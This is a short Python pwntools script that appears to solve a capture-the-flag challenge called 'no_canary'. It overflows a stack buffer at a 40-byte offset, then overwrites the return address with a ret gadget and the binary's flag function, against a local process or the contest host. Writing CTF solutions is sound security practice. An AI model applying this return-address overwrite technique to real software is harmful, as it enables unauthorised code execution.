from pwn import *
import sys

context.clear(arch='amd64', os='linux')

argv = sys.argv
binary_path = './no_canary'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('shell.actf.co', 20700)
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* main+324
		''')

e = ELF(binary_path)

# ------------- plan -----------
# overwrite rip using bof with flag function

overflow_offset = 40
ret_gadget = 0x40101a

payload = fit({
	overflow_offset: p64(ret_gadget),
	overflow_offset + 8 : p64(e.sym['flag'])

	})

sh.sendline(payload)

print sh.recvall()


